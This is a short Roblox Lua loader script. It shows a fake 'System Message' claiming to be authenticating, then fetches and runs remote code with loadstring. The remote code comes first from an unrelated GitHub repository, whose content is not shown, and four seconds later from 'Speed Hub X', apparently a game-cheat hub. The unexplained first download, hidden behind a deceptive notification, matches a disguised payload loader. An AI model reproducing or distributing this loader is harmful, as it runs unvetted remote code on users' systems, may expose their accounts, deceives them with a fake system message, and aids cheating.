-- Notification right away
game.StarterGui:SetCore("SendNotification", {
    Title = "System Message",
    Text = "🔒 Authenticating... Please stand by.",
    Duration = 3
})

-- Second script right away
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"))()
end)

-- Wait 4 seconds, then load Speed Hub X
task.delay(4, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
